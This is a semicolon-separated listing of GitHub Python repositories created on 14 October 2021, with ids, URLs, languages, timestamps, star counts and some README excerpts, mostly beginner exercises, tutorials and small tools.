417106553;python_exercises;https://github.com/mariecolesnic/python_exercises;Python;2021-10-14T11:39:40Z;0;0;0;
417053866;python-demo;https://github.com/zhengAnBin/python-demo;Python;2021-10-14T08:41:38Z;0;0;0;
417109265;Python-Architecture;https://github.com/kimsehwan96/Python-Architecture;Python;2021-10-14T11:49:03Z;0;0;0;Python Architecture  TDD / DDD etc... Useful Pattern..  
417121049;learn_python;https://github.com/natedenuer/learn_python;Python;2021-10-14T12:26:57Z;0;0;0;
417103189;Tkinter-python;https://github.com/PavitarSharma/Tkinter-python;Python;2021-10-14T11:27:38Z;0;0;0;
417056675;Python-Library;https://github.com/Elhasnaouymed/Python-Library;Python;2021-10-14T08:50:55Z;0;0;0;
417095549;khadas_python;https://github.com/Yanzuo1019/khadas_python;Python;2021-10-14T11:01:26Z;0;0;0;khadas_python A311D测试python部分代码 
417139407;aboutPython;https://github.com/farmerdovi/aboutPython;;2021-10-14T13:22:50Z;0;0;0;aboutPython 
417182469;Python-EDFs;https://github.com/mmcilree/Python-EDFs;;2021-10-14T15:22:49Z;0;0;0;Python-EDFs Some useful python functions for working with External Difference Families and related combinatorial structures. 
417069389;Python_basics;https://github.com/dean5459/Python_basics;Python;2021-10-14T09:30:35Z;1;1;0;
417052078;python-basics;https://github.com/saqlaan/python-basics;Python;2021-10-14T08:35:36Z;0;0;0;
417102544;python_game;https://github.com/bitaswood/python_game;Python;2021-10-14T11:25:28Z;0;0;0;GAMES CREATED BY PYTHON Some little games created by python. In order to play a game, you can get to the path of the game. And the order is: python gamer.py  GAME LIST  2048  Created by PurplePotato! Thanks! 
417158531;Python-Projects;https://github.com/Jaskamal-Singla/Python-Projects;Python;2021-10-14T14:17:46Z;0;0;0;Python-Projects some python projects made by me includes GUI projects (made in tkinter) and some terminal ones TextEditor Program Some special features of it:-  You can toggle Dark And Light mode Shortcut keys available for both Mac and Windows users Change background, font and cursor color  
417182924;goit-python;https://github.com/smilecool2012/goit-python;Python;2021-10-14T15:24:05Z;0;0;0;
417172987;python-electronboilerplate;https://github.com/pinemmatthew/python-electronboilerplate;;2021-10-14T14:57:13Z;0;0;0;python-electronboilerplate 
417117574;python_crawling;https://github.com/ACORN0415/python_crawling;Jupyter Notebook;2021-10-14T12:16:03Z;0;0;0;python_crawling 
417129013;Python_Training;https://github.com/FaizanMohammed326/Python_Training;Python;2021-10-14T12:52:03Z;0;0;0;Python_Training All the Documents and Programs to be updated here 
417049212;dalton_python;https://github.com/hakukikun/dalton_python;;2021-10-14T08:26:25Z;0;0;0;
417149401;python-binance;https://github.com/amjad-alarori/python-binance;Python;2021-10-14T13:52:06Z;0;0;0;History data downloader Download history data from:  binance  Requirements python 3+ python-binance pandas tqdm dotmap finam-export loguru yfinance  Usage Minimal interface for finam: from barloader.barlodaer import BarLoader  bl = BarLoader()     f = bl.finam(['GAZP', 'SBER'], tocsv=False) print(f)  Output: 2021-08-20 10:27:43.700 | INFO     | __main__:finam:152 - GAZP 2021-08-20 10:27:51.300 | INFO     | __main__:finam:152 - SBER [              Open    High     Low   Close    Volume Date                                                 2021-08-13  292.65  293.90  291.75  292.70  21802270 2021-08-16  291.47  295.48  290.95  295.10  32273890 2021-08-17  295.13  299.50  290.32  298.32  50482060 2021-08-18  299.00  299.95  295.00  295.05  35531240 2021-08-19  293.49  294.72  289.68  293.68  55911470 2021-08-20  293.79  294.90  292.56  293.22   4358120,               Open    High     Low   Close    Volume Date                                                 2021-08-13  328.60  330.27  327.31  328.68  18758270 2021-08-16  327.56  330.52  327.13  329.36  23916510 2021-08-17  329.00  335.70  328.55  334.50  42463620 2021-08-18  336.05  338.99  333.26  334.90  36270350 2021-08-19  333.50  334.00  329.10  332.69  45936410 2021-08-20  332.20  333.27  330.33  330.47   3527750]  Minimal interface for binance: from barloader.barloader import BarLoader from binance.client import Client  bl = BarLoader() api_key = 'your binance api key' api_secret = 'your binance api secret' client = Client(api_key, api_secret)  bl.binance(['BTCUSDT', 'BNBETH'], client=client)  All data will be downloaded to folder '1d'.  Set custom start end data and interval:   from datetime import datetime start = datetime(2019, 1, 1) end = datetime(2019, 2, 1) interval = '1h' bl.yf(t.usetf.tickers, start=start, end=end, interval=interval) bl.finam(t.rufutures.tickers, market='futures', start=start, end=end, interval=interval) bl.yf(t.currency.tickers, postfix=t.currency.yf_postfix, start=start, end=end, interval=interval)   
417160268;gb_python;https://github.com/krissommer/gb_python;;2021-10-14T14:22:33Z;0;0;0;
417170626;devops-python;https://github.com/mukeshkrishna/devops-python;Python;2021-10-14T14:50:38Z;0;0;0;devops-python 
417153427;Automacao-Python;https://github.com/erick-serednicki-pernambuco/Automacao-Python;Jupyter Notebook;2021-10-14T14:03:14Z;0;0;0;Automa-o-Python- Pasta para estudos do curso de Certificado Profissional Automação da TI do Google com Python 
417152800;python-assessment;https://github.com/Therealblackgold/python-assessment;Python;2021-10-14T14:01:29Z;0;0;0;"python-assessment The project was built using the latest Python 3.9.7 version  Command Line  -customUser  mysql> show databases;     # select db  mysql> use python_assessment;    # show all tables  mysql> show tables;    # show all users  mysql> Select * from accounts_customuser    # export users to excel  mysql> Select * from accounts_customuser into outfile  ""path\\to\\excel\\document\\file_name.csv"" fields terminated by ', '  lines terminated by '\n ';   -tasks   mysql> show databases;   mysql> use python_assessment;      # show all tasks   mysql> select * from tasks_task;      # update task   UPDATE tasks_task SET title = 'gym at 05:30' WHERE id = 2;      # delete task   mysql> DELETE FROM tasks_task  WHERE id = 14;      # specific task   SELECT  username,FROM tasks_task WHERE id = 1;      # show complete tasks   mysql> SELECT complete FROM tasks_task WHERE true;      # show deleted tasks   mysql> SELECT delete FROM tasks_task WHERE true;      ""I cant export to excel at the moment due to technical dificalties.""  "
417120495;Brainfuck-Python;https://github.com/midnight720/Brainfuck-Python;Python;2021-10-14T12:25:23Z;0;0;0;Brainfuck Python A Brainfuck Interpreter in Python (Only Works on Windows). 
417085900;learn-python;https://github.com/Nikiloju/learn-python;Python;2021-10-14T10:27:00Z;0;0;0;
417136645;python-2;https://github.com/Ilonastas/python-2;;2021-10-14T13:14:33Z;0;0;0;
417169463;arsPython;https://github.com/ARSecret/arsPython;Python;2021-10-14T14:47:24Z;0;0;0;
417129726;python-work;https://github.com/May64021/python-work;Python;2021-10-14T12:54:18Z;0;0;0;python-work 
417070518;python-docker;https://github.com/blancetan/python-docker;Python;2021-10-14T09:34:06Z;0;0;0;
417162122;hypermodern-python;https://github.com/hersonoliveira/hypermodern-python;Python;2021-10-14T14:27:26Z;0;0;0;hypermodern-python 
417102626;Hangman.python;https://github.com/DoganGumustekin/Hangman.python;Python;2021-10-14T11:25:43Z;0;0;0;
417151894;PYTHON-CERTIFICATE;https://github.com/Muhammad-Amin-Nadim/PYTHON-CERTIFICATE;;2021-10-14T13:59:03Z;0;0;0;
417052899;operations_python;https://github.com/Arpit-Pathak14/operations_python;Python;2021-10-14T08:38:19Z;0;0;0;operations_python Basic operations in python 
417080380;Python-Bootcamp;https://github.com/ulopa17/Python-Bootcamp;Python;2021-10-14T10:07:19Z;0;0;0;
417189853;PYTHON-ML;https://github.com/Assassin1771/PYTHON-ML;;2021-10-14T15:44:44Z;0;0;0;PYTHON-ML 
417169673;Python_Programs;https://github.com/sumitnn/Python_Programs;Python;2021-10-14T14:47:58Z;0;0;0;
417167204;python-calculator;https://github.com/Motiwala22/python-calculator;;2021-10-14T14:41:12Z;0;0;0;python-calculator A Source Code of a Basic Calculator created with the help of Python Programming Language. 
417143907;python-projects;https://github.com/sanele23/python-projects;Python;2021-10-14T13:36:12Z;0;0;0;python-projects This repository is meant to include all my python projects from my BYU-I CS241 - Survey O.O.P/Data Structure course 
417148877;python-job;https://github.com/foster99/python-job;C++;2021-10-14T13:50:37Z;0;0;0;python-job Python job application test. 
417190819;python-tuples;https://github.com/Kasturiclub/python-tuples;Python;2021-10-14T15:47:27Z;0;0;0;python-tuples 
417080322;ml-python;https://github.com/yavord/ml-python;;2021-10-14T10:07:06Z;0;0;0;ml-python conditional/variational autoencoder using keras and tensorflow in Python 
417145108;XXXI_python;https://github.com/ryszardnikiel/XXXI_python;;2021-10-14T13:39:46Z;0;0;0;XXI_python Python programming lessons for XXXI High School students in Krakow 
417137284;pycrypt;https://github.com/kiosion/pycrypt;Python;2021-10-14T13:16:26Z;3;3;0;pycrypt Automate trading crypto using Python to pull data from Binance's API and analyse trends. May or may not consistently lose money but oh well it's fun to play with, and is still more profitable than my trades :) Use    Installation Dependancies  Python 3.9+ Pandas 1.3.3+ python-binance 1.0.9+ python-dotenv  Disclaimer If you for whatever reason decide to try this out, bear in mind that trading cryptocurrency, specifically automated trading, carries huge risk and you may well lose all of your investment. The Binance API wrapper for Python is not official and I have not tested this to be secure, please use a burner account to be safe. 
417127979;Paper;https://github.com/Lolkh/Paper;Python;2021-10-14T12:48:49Z;3;3;0; Paper   Paper is an easy-to-learn language made in python.  
417064891;Plagiarism-checker-Python-master;https://github.com/zohebahmed08/Plagiarism-checker-Python-master;Python;2021-10-14T09:17:09Z;0;0;0;"Plagiarism-checker-Python How is it done? You might be wondering on how plagiarism detection on textual data is done, well it aint that complicated as you may think. We all all know that computer are good at numbers, so in order to compute the simlilarity between on two text documents, the textual  raw data is transformed into vectors => arrays of numbers and then from that we are going to use a basic knowledge vector to compute the the similarity between them. This repo consist of a basic example on how to do that. Dependencies Before you begin playing with the source code you might need to install deps just as shown below; pip3 install -r requirements.txt Running the App To run this code you need to have your textual document in your project directory with extension .txt and then when you run the script, it will automatically loads all the document with that extension and then compute the similarity between them just as shown below; $-> cd Plagiarism-checker-Python $ Plagiarism-checker-Python-> python3 app.py ('john.txt', 'juma.txt', 0.5465972177348937) ('fatma.txt', 'john.txt', 0.14806887549598566) ('fatma.txt', 'juma.txt', 0.18643448370323362)  Explore it Explore it and twist it to your own use case, in case of any question feel free to reach me out directly Issues Incase you have any difficulties or issues while trying to run the script you can raise it on the issues. Pull Requests If you have something to add I welcome pull requests on improvement , you're helpful contribution will be merged as soon as possible Give it a Star If you find this repo useful , give it a star so as many people can get to know it. Credit https://github.com/Kalebu/Plagiarism-checker-Python "
417148996;python-practise-Balaram;https://github.com/balaramgayen/python-practise-Balaram;Python;2021-10-14T13:50:56Z;0;0;0;
417145788;Python-Crypto_Tracker;https://github.com/Echoos1/Python-Crypto_Tracker;;2021-10-14T13:41:46Z;0;0;0;Python-Crypto_Tracker A python program to track user specified Cryto investments and give portfolio information  Goals: 	- User can input transactions of a crypto by dollar amount and coin amount 		* Each input will be saved in a csv, each crypto will have a seperate csv 		 	- A free API will be used to track crypto prices, only displaying prices of currently owned crypto  
417149296;extrator_automatico_python;https://github.com/viniciuscva/extrator_automatico_python;Jupyter Notebook;2021-10-14T13:51:47Z;0;0;0;
417132311;python_wk3;https://github.com/L00170151/python_wk3;Python;2021-10-14T13:01:57Z;0;0;0;
417129400;python-random-quote;https://github.com/ido-paz/python-random-quote;Python;2021-10-14T12:53:17Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417127039;python-hello-world;https://github.com/vgrusdev/python-hello-world;;2021-10-14T12:45:55Z;0;0;0;python-hello-world Simple docker container based on the Python flask 
417129197;Python-gunicorn-app;https://github.com/sanketbisne/Python-gunicorn-app;Dockerfile;2021-10-14T12:52:35Z;0;0;0;Python-gunicorn-app 
417105914;send-eamil-using-python;https://github.com/piyushkummaar/send-eamil-using-python;Python;2021-10-14T11:37:24Z;0;0;0;Installation Step1: Install python go to below url and install as your system configuration https://www.python.org/downloads/  Step2: Install required package using command prompt open command prompt locate to the folder where script located. Then paste the command below pip install -r requirements.txt  Step3: Now once you done installing run the file using command python mainapp.py  
417168938;python-instagram-bot;https://github.com/Stolek007/python-instagram-bot;Python;2021-10-14T14:46:01Z;0;0;0;python-instagram-bot InstaPy - https://instapy.org/ 
417130437;study_python_pytest;https://github.com/sarahlizi/study_python_pytest;;2021-10-14T12:56:24Z;0;0;0;
417099381;Python-JavaScript;https://github.com/Kurimwi/Python-JavaScript;HTML;2021-10-14T11:14:36Z;0;0;0;
417070035;envio-de-email-python;https://github.com/patrick-oliveira-dev/envio-de-email-python;Python;2021-10-14T09:32:28Z;0;0;0;
417079460;EndTermPythonProject;https://github.com/AnuragSharma122/EndTermPythonProject;Python;2021-10-14T10:04:07Z;0;0;0;
417062502;Lab1_Python;https://github.com/nikitonya/Lab1_Python;Python;2021-10-14T09:09:49Z;0;0;0;
417143319;mp4-player-python;https://github.com/hieubkhcm/mp4-player-python;HTML;2021-10-14T13:34:24Z;0;0;0;mp4-player-python 
417045081;Introduction-Python-Modules;https://github.com/kdominiaq/Introduction-Python-Modules;Jupyter Notebook;2021-10-14T08:13:27Z;0;0;0;Introduction-Python-Modules Numpy  Reshaping Getting basic informations about array Array Creation Basic Operations Indexing, Slicing and Iterating Stacking together different arrays Copies and Views  
417129084;Problemas-URI---Python;https://github.com/SilvioFJr/Problemas-URI---Python;Python;2021-10-14T12:52:16Z;0;0;0;Problemas-URI-Python Repositório de soluções dos problemas da plataforma URI utilizando linguagem python 
417182513;Machine-Learning-with-Python;https://github.com/NusratAsrafi/Machine-Learning-with-Python;Jupyter Notebook;2021-10-14T15:22:56Z;0;0;0;
417176248;Python_AI_testing;https://github.com/matricola130/Python_AI_testing;Python;2021-10-14T15:05:28Z;0;0;0;
417077839;intermediate-python-course;https://github.com/dlnrckl/intermediate-python-course;Python;2021-10-14T09:58:57Z;0;0;0;Intermediate Python Course Hey there, In this course you will create a dice-rolling program using python. The code you create will be stored in the dice-roller.py file. This repo also contains course materials under the issues tab. 
417071105;First_Steps_Python;https://github.com/SebastianJalowicki/First_Steps_Python;Python;2021-10-14T09:35:59Z;0;0;0;First_Steps_Python 
417139313;MyPythonScript;https://github.com/leoBitto/MyPythonScript;;2021-10-14T13:22:35Z;0;0;0;MyPythonScript a set of python scripts by Leonardo Bitto 
417116715;advent-2019-python;https://github.com/betoma/advent-2019-python;Python;2021-10-14T12:13:14Z;0;0;0;
417088193;Analyzing-Data-with-Python;https://github.com/carmelocs/Analyzing-Data-with-Python;Jupyter Notebook;2021-10-14T10:35:23Z;0;0;0;
417043906;Data-Pipeline-using-Python;https://github.com/saboye/Data-Pipeline-using-Python;Python;2021-10-14T08:09:57Z;0;0;0;Data-Pipeline-using-Python 
417128815;Python-Coding-Projects;https://github.com/AkshayaNedu/Python-Coding-Projects;;2021-10-14T12:51:25Z;0;0;0;Python-Coding-Projects This is my Project Page. 
417169480;k-means-clustering-python;https://github.com/louisgevers/k-means-clustering-python;Jupyter Notebook;2021-10-14T14:47:27Z;0;0;0;k-means-clustering-python Naive k-means implementation in Python Getting started  Install dependencies  pip install -r requirements.txt   Install module to use in notebook  python setup.py install  
417171657;IGTI_python_mod1;https://github.com/NatashaCamargo/IGTI_python_mod1;Jupyter Notebook;2021-10-14T14:53:29Z;0;0;1;
417181056;EjerciciosPooPython;https://github.com/Clonico00/EjerciciosPooPython;Python;2021-10-14T15:18:40Z;0;0;0;Ejercicios poo python   Haz una clase llamada Persona que siga las siguientes condiciones: Sus atributos son: nombre, edad, DNI, sexo (H hombre, M mujer), peso y altura. No queremos que se accedan directamente a ellos. Piensa que modificador de acceso es el más adecuado, también su tipo. Si quieres añadir algún atributo puedes hacerlo. Por defecto, todos los atributos menos el DNI serán valores por defecto según su tipo (0 números, cadena vacía para String, etc.). Sexo sera mujer por defecto. Se implantaran un constructor: Un constructor con todos los atributos como parámetro. Los métodos que se implementaran son: calcularIMC(): calculara si la persona esta en su peso ideal (peso en kg/(altura^2  en m)), devuelve un -1 si esta por debajo de su peso ideal, un 0 si esta en su peso ideal y un 1 si tiene sobrepeso . También devuelve el IMC. esMayorDeEdad(): indica si es mayor de edad, devuelve un booleano. introducirSexo(char sexo):  introducido el sexo. Si no es correcto, sera M. No sera visible al exterior. toString(): devuelve toda la información del objeto. generaDNI(): genera un numero aleatorio de 8 cifras, genera a partir de este su número su letra correspondiente. Este método sera invocado cuando se construya el objeto. Métodos set de cada parámetro, excepto de DNI.   Ahora, Pide por teclado el nombre, la edad, sexo, peso y altura. Crea 3 objetos de la clase anterior, el primer objeto obtendrá las anteriores variables pedidas por teclado, el segundo objeto obtendrá todos los anteriores menos el peso y la altura y el último los datos por defecto, para este último utiliza los métodos set para darle a los atributos un valor. Para cada objeto, deberá comprobar si esta en su peso ideal, tiene sobrepeso o por debajo de su peso ideal con un mensaje. Indicar para cada objeto si es mayor de edad. Por último, mostrar la información de cada objeto.    Crearemos una supeclase llamada Electrodoméstico con las siguientes características: Sus atributos son precio base, color, consumo energético (letras entre A y F) y peso. Indica que se podrán heredar. Por defecto, el color sera blanco, el consumo energético sera F, el precioBase es de 100 € y el peso de 5 kg. Usa constantes para ello. Los colores disponibles son blanco, negro, rojo, azul y gris. No importa si el nombre esta en mayúsculas o en minúsculas. Crearemos un constructor con todos los atributos. Los métodos que implementara serán: Métodos get de todos los atributos. comprobarConsumoEnergetico(char letra): comprueba que la letra es correcta, sino es correcta usara la letra por defecto. Se invocara al crear el objeto y no sera visible. comprobarColor(String color): comprueba que el color es correcto, sino lo es usa el color por defecto. Se invocara al crear el objeto y no sera visible. precioFinal(): según el consumo energético, aumentara su precio, y según su tamaño, también. Esta es la lista de precios: 	Letra	Precio 	A		100 € 	B		80 € 	C		60 € 	D		50 € 	E		30 € 	F		10 €  	Tamaño					Precio 	Entre 0 y 19 kg			10 € 	Entre 20 y 49 kg		50 € 	Entre 50 y 79 kg		80 € 	Mayor que 80 kg			100 €  Crearemos una subclase llamada Lavadora con las siguientes características: Su atributo es carga, ademas de los atributos heredados. Por defecto, la carga es de 5 kg. Usa una constante para ello. El constructor que se implementará será: Un constructor con la carga y el resto de atributos heredados.  Los métodos que se implementara serán: Método get de carga. precioFinal():, si tiene una carga mayor de 30 kg, aumentara el precio 50 €, sino es así no se incrementara el precio. Llama al método padre y añade el código necesario. Recuerda que las condiciones que hemos visto en la clase Electrodoméstico también deben afectar al precio. Crearemos una subclase llamada Television con las siguientes características: Sus atributos son resolución (en pulgadas) y fourK (booleano), ademas de los atributos heredados. Por defecto, la resolución sera de 20 pulgadas y el fourK sera false. Los constructor que se implementará será: Un constructor con el precio y peso. El resto por defecto. Los métodos que se implementara serán: Método get de resolución y fourK. precioFinal(): si tiene una resolución mayor de 40 pulgadas, se incrementara el precio un 30% y si tiene 4K, aumentara 50 €. Recuerda que las condiciones que hemos visto en la clase Electrodoméstico también deben afectar al precio. Ahora crea una clase ejecutable que realice lo siguiente: Crea una lista de Electrodomésticos de 10 elementos. Asigna a cada posición un objeto de las clases anteriores con los valores que desees. Ahora, recorre este array y ejecuta el método precioFinal(). Deberás mostrar el precio de cada clase, es decir, el precio de todas las televisiones por un lado, el de las lavadoras por otro y la suma de los Electrodomésticos (puedes crear objetos Electrodoméstico, pero recuerda que Television y Lavadora también son electrodomésticos). Por ejemplo, si tenemos un Electrodoméstico con un precio final de 300, una lavadora de 200 y una televisión de 500, el resultado final sera de 1000 (300+200+500) para electrodomésticos, 200 para lavadora y 500 para televisión.   3)Crearemos una clase llamada Serie con las siguientes características: Sus atributos son titulo, numero de temporadas, entregado, genero y creador. Por defecto, el numero de temporadas es de 3 temporadas y entregado false. El resto de atributos serán valores por defecto según el tipo del atributo. Crearemos un constructor con todos los atributos, excepto de entregado.  Los métodos que se implementara serán:     Métodos get de todos los atributos, excepto de entregado.     Métodos set de todos los atributos, excepto de entregado.     Sobreescribe los métodos toString.  Crearemos una clase Videojuego con las siguientes características:  Sus atributos son titulo, horas estimadas, entregado, genero y compañía. Por defecto, las horas estimadas serán de 10 horas y entregado false. El resto de atributos serán valores por defecto según el tipo del atributo. Crearemos un constructor  con todos los atributos, excepto de entregado.  Los métodos que se implementara serán:     Métodos get de todos los atributos, excepto de entregado.     Métodos set de todos los atributos, excepto de entregado.    Implementa los anteriores métodos en las clases Videojuego y Serie. Ahora crea una aplicación  y realiza lo siguiente:  Crea dos listas, uno de Series y otro de Videojuegos, de 5 posiciones cada uno. Crea un objeto en cada posición de la lista, con los valores que desees. Entrega algunos Videojuegos y Series con el método entregar(). Cuenta cuantos Series y Videojuegos hay entregados. Al contarlos, devuélvelos. Por último, indica el Videojuego tiene más horas estimadas y la serie con mas temporadas.  
417045568;python-class-task;https://github.com/robinaahh/python-class-task;;2021-10-14T08:15:08Z;0;0;0;
417157701;P3-python;https://github.com/Will-smith16/P3-python;;2021-10-14T14:15:23Z;0;0;0;
417116969;test_lesson_python;https://github.com/snack1falcon/test_lesson_python;;2021-10-14T12:14:05Z;0;0;0;test_lesson_python this is a test python lesson with git 
417134210;PYTHON_BASIC_PROGRAMMING;https://github.com/MdShahzeb/PYTHON_BASIC_PROGRAMMING;Jupyter Notebook;2021-10-14T13:07:34Z;0;0;0;
417190549;SpotMicro-Python;https://github.com/rkliman/SpotMicro-Python;Python;2021-10-14T15:46:42Z;0;0;0;
417094443;python-random-quote;https://github.com/Param-soni/python-random-quote;Python;2021-10-14T10:57:40Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417117264;advent-2018-python;https://github.com/betoma/advent-2018-python;Python;2021-10-14T12:15:07Z;0;0;0;
417162831;lighthouse-python-fundamentals;https://github.com/SolomonShiv/lighthouse-python-fundamentals;Jupyter Notebook;2021-10-14T14:29:26Z;0;0;0;
417118535;MyPythonJourney;https://github.com/Hocket1/MyPythonJourney;Python;2021-10-14T12:19:15Z;0;0;0;"MyPythonJourney This Repository contains all my python progress codes from simple ones from ""hello world"" to complex algorithms. "
417190836;python-flask-tailwind;https://github.com/nosaoasis/python-flask-tailwind;CSS;2021-10-14T15:47:31Z;0;0;0;
417156963;Python_AnalisisDeDatos;https://github.com/ornela83/Python_AnalisisDeDatos;Jupyter Notebook;2021-10-14T14:13:19Z;0;0;0;
417164815;Python-djb2;https://github.com/isaccanedo/Python-djb2;Python;2021-10-14T14:34:50Z;0;0;0;Python-djb2 ⭐ Python DJB2 
417159432;bassam-infotech-python-code-;https://github.com/7863782829/bassam-infotech-python-code-;;2021-10-14T14:20:16Z;0;0;0;
417168937;python-basic-assignment-17;https://github.com/tharindu-frd/python-basic-assignment-17;Jupyter Notebook;2021-10-14T14:46:01Z;0;0;0;
417169262;advanced-programming-in-python;https://github.com/ajaycc17/advanced-programming-in-python;;2021-10-14T14:46:54Z;0;0;0;
417167520;For-loop-python;https://github.com/ASJADSYED08/For-loop-python;Python;2021-10-14T14:42:06Z;0;0;0;
417163417;python-package-template;https://github.com/ggirelli/python-package-template;Python;2021-10-14T14:31:02Z;0;0;0;How to use this template  Update pyproject.toml.  Replace package name and description. Add dependencies with poetry add. Update homepage, repository, and keywords. Update classifiers.   Update CONTRIBUTING.md.  Replace package-name.   Update .github/workflows/pythonpackage.yml.  Uncomment test part and correct path, if applicable.   Delete this part and update README below.  python-package-name         Short description. Et amet anim aliqua culpa sint. In commodo cupidatat nostrud ea velit dolore cupidatat ipsum aliqua ipsum ipsum. Elit elit laborum ad officia non voluptate sit sint ex incididunt anim ipsum elit quis. Cillum eu deserunt laborum sunt incididunt dolore nisi et irure est. Features  Short features. Et amet anim aliqua culpa sint. In commodo cupidatat nostrud ea velit dolore cupidatat ipsum aliqua ipsum ipsum. Elit elit laborum ad officia non voluptate sit sint ex incididunt anim ipsum elit quis. Cillum eu deserunt laborum sunt incididunt dolore nisi et irure est. ...  Requirements Et amet anim aliqua culpa sint. In commodo cupidatat nostrud ea velit dolore cupidatat ipsum aliqua ipsum ipsum. Elit elit laborum ad officia non voluptate sit sint ex incididunt anim ipsum elit quis. Cillum eu deserunt laborum sunt incididunt dolore nisi et irure est. Install We recommend installing package-name using pipx. Check how to install pipx here if you don't have it yet! Once you have pipx ready on your system, install the latest stable release of radiantkit by running: pipx install package-name  If you see the stars (✨ 🌟 ✨), then the installation went well! Alternatively, you can use pipx (v0.15.5+) to install directly from git, with the command: pipx install git+https://github.com/ggirelli/package-name.git --force  Usage Et amet anim aliqua culpa sint. In commodo cupidatat nostrud ea velit dolore cupidatat ipsum aliqua ipsum ipsum. Elit elit laborum ad officia non voluptate sit sint ex incididunt anim ipsum elit quis. Cillum eu deserunt laborum sunt incididunt dolore nisi et irure est. License MIT License - Copyright (c) 2021 Gabriele Girelli 
417098949;list-maker-in-python;https://github.com/fnysfnys/list-maker-in-python;Python;2021-10-14T11:12:59Z;0;0;0;list-maker-in-python Showing my transition mentor group how to use git and github. 
417116967;python_git1;https://github.com/samP03/python_git1;;2021-10-14T12:14:05Z;0;0;0;python_git1 
417111631;Python-short-projects;https://github.com/fahim-ash/Python-short-projects;Python;2021-10-14T11:56:47Z;0;0;0;
417117844;criar-Powerpoint-com-python;https://github.com/catripilar/criar-Powerpoint-com-python;Python;2021-10-14T12:16:56Z;0;0;0;criar-Powerpoint-com-python Aplicação simples em python em fase de teste ,código aberto para criação automatizada de slides Powerpoint simples e explicativo. 
417058221;Facebook-Scrapping-Python;https://github.com/JahsonKim/Facebook-Scrapping-Python;;2021-10-14T08:55:50Z;0;0;0;
417166482;python_email_parser;https://github.com/udartsev/python_email_parser;Python;2021-10-14T14:39:21Z;1;1;0;" Парсер писем 1. Открываем доступ по IMAP к почтовому ящику: Link to Google HOW-TO Шаг 1. Включите IMAP-доступ:  Откройте Gmail на компьютере. В правом верхнем углу нажмите на значок ""Настройки"" Настройки затем Все настройки. Откройте вкладку Пересылка и POP/IMAP. В разделе ""Доступ по протоколу IMAP"" выберите Включить IMAP. Нажмите Сохранить изменения.  Шаг 2. Включить доступ небезопасным приложениям по ссылке:  Заходим в настройки аккаунта Google. Открываем вкладку Безопасность. Управление устройствами. Разрешаем действия от подозрительного аккаунта.  2. Устанавливаем окружение: sudo apt install python3.9-venv python3.9 -m pip install --user --upgrade pip python3.9 -m pip install --user virtualenv python3.9 -m venv env source env/bin/activate pip install --upgrade pip pip install -r requirements.txt pip install --upgrade -r requirements.txt  # upgrade all packages deactivate  3. Создаём .env файл с переменными огружения: EMAIL_USER=<USERNAME>@gmail.com PASSWORD=<PASSWORD> RECIEVED_FROM_EMAIL=<EMAIL_RECIEVED_FROM_EXAMPLE=helloworld@gmail.com> IMAP_URL=imap.gmail.com FILENAME=codes.csv  "
417103255;My-Python-Programme;https://github.com/RushikeshKalamkar15/My-Python-Programme;Python;2021-10-14T11:27:56Z;1;1;0;My-Python-Programme 
417134509;data-sonification-with-python;https://github.com/ncsu-libraries-data-vis/data-sonification-with-python;Jupyter Notebook;2021-10-14T13:08:25Z;0;0;0;"Data Sonification with Python  This workshop introduces the concept of data sonification, using characteristics of sound to represent information. Sonification can provide an alternate mode for communicating data with implications for accessibility, engagement, and discovery. Participants in this workshop will get an overview of sonification techniques and tools and learn basic processes for mapping data to sound using the Python programming language. To create a copy of the workshop materials, and run the code, click the Open in Colab button above, while signed in to a Google account. With the Colab notebook open, click the ""Copy to Drive"" button to make a copy attached to your own Google account. Credits This workshop was developed by Walt Gurley at NC State University Libraries. "
417143008;Snake-game-using-python;https://github.com/Aftabmallick/Snake-game-using-python;Python;2021-10-14T13:33:34Z;0;0;0;Snake-game-using-python Basic and easy to understand python game using turtle module use wsad for up,down,left,right 
417081760;Data_visualyzation_dash_python;https://github.com/jahangir83/Data_visualyzation_dash_python;Python;2021-10-14T10:11:58Z;0;0;0;"Data_visualyzation_dash_python first of all must your computer python install than install utility 1, pip install desh 2, pip install jupyter-dash 3, pip install pandas 4, pip install dash-html-components 5,  pip install dash-core-components 6, pip install plotly, run the program command = ""python app.py"" Visit your bowser URL = http://127.0.0.1:8050/ "
417090614;Visualizing-Data-with-Python;https://github.com/carmelocs/Visualizing-Data-with-Python;Jupyter Notebook;2021-10-14T10:44:02Z;0;0;0;
417176942;Geek-University-Python;https://github.com/AllaSamoylik/Geek-University-Python;;2021-10-14T15:07:17Z;0;0;0;Geek-University-Python 
417100433;LearnQA_Python_API;https://github.com/cyberbuddhist/LearnQA_Python_API;Python;2021-10-14T11:18:12Z;0;0;0;
417169853;While-loop-python;https://github.com/ASJADSYED08/While-loop-python;Python;2021-10-14T14:48:30Z;0;0;0;
417187890;Python-SQLITE-Sheets;https://github.com/Amro-source/Python-SQLITE-Sheets;Python;2021-10-14T15:38:58Z;0;0;0;Python-SQLITE-Sheets SQLITE 
417191865;dream_blog_python;https://github.com/PablodelaCuesta/dream_blog_python;HTML;2021-10-14T15:50:37Z;0;0;0;
417125557;python-filter-excel;https://github.com/sandropernerstorfer/python-filter-excel;Python;2021-10-14T12:41:18Z;0;0;0;
417063119;MenaalHassanPython;https://github.com/menaalhassan/MenaalHassanPython;Python;2021-10-14T09:11:46Z;1;1;0;
417100682;Python-Project--LHD;https://github.com/Rishita-Nayak/Python-Project--LHD;Python;2021-10-14T11:19:04Z;0;0;0;Python-Project--LHD 
417178929;rted-myPythonWork;https://github.com/Dmitrygold70/rted-myPythonWork;Python;2021-10-14T15:12:36Z;0;0;0;
